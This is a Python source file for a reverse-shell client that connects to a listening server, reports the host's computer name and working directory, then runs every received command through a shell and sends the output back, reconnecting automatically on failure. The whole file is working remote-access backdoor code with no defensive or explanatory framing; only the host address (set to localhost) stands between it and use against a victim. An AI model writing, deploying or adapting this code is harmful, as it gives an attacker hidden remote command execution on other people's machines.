import subprocess
import os
import socket
import time


class ReverClient:

    def __init__(self):
        try:
            self.host = '127.0.0.1'
            self.port = 8765
            self.s = socket.socket()
        except socket.error as err:
            print('[!] Socket creation failed: ' + str(err))

    def connect_socket(self):
        """
        Connects to the server
        """
        try:
            # Connects to the socket given the host and port
            self.s.connect((self.host, self.port))

            # Sends info about this client and sleeps so the server can get the other message
            time.sleep(0.1)
            self.s.send(str.encode(os.environ['COMPUTERNAME']))
            time.sleep(0.1)
            self.s.send(str.encode(os.getcwd()))
        except socket.error as err:
            print('[!] Couldn\'t connect to the server: ' + str(err))
            print('[!] Retrying...')
            self.s.close()
            self.s = socket.socket()
            self.connect_socket()

    def receive_commands(self):
        """
        Receives commands until 'quit' is received
        """
        while True:
            try:
                sign = self.s.recv(1024)
                time.sleep(0.1)
                self.s.send(sign)
            except:
                self.s.close()
                self.s = socket.socket()
                self.connect_socket()
                continue
            cont = True
            if sign == b'ayylmao':
                continue

            # Command received
            rdata = self.s.recv(10240)
            cmdd = rdata.decode('utf-8')[:]
            args = cmdd.split()

            # CD command
            if args[0] == 'cd':
                try:
                    os.chdir(args[1])
                except:
                    self.s.send(str.encode(os.getcwd(), errors='ignore'))
                    time.sleep(0.1)
                    self.s.send(str.encode(os.getcwd()))

            # Checks if any of the commands above where executed
            else:
                cont = False
            if cont:
                self.s.send(str.encode(os.getcwd(), errors='ignore'))
                time.sleep(0.1)
                self.s.send(str.encode(os.getcwd()))
                continue

            # Normal proccesses
            try:
                cmd = subprocess.Popen(cmdd, shell=True, stdout=-1, stderr=-1, stdin=-1)
                output = str(cmd.stdout.read() + cmd.stderr.read(), 'utf-8', errors='ignore')
                if output == '':
                    self.s.send(str.encode('\n[*] Command executed\n', errors='ignore'))
                    time.sleep(0.1)
                    self.s.send(str.encode(os.getcwd()))
                    continue
                self.s.send(str.encode(output, errors='ignore'))
                time.sleep(0.1)
                self.s.send(str.encode(os.getcwd()))
            except:
                self.s.send(str.encode('[!] Error  \n'))
                time.sleep(0.1)
                self.s.send(str.encode(os.getcwd()))

# Starting client
client = ReverClient()
client.connect_socket()
client.receive_commands()


